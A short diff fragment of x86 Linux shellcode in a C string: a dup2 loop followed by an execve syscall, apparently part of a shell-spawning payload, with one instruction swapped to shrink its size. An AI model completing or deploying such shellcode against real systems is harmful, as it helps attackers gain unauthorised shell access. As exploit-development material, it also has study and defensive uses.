@@ -82,7 +82,7 @@ duploop:  \n \
 	push ecx,  \n \
 	*PATH*  \n \
 	mov ebx, esp  \n \
-	xor edx, edx  \n \
+	cdq  \n \
 	int 0x80"
 
 
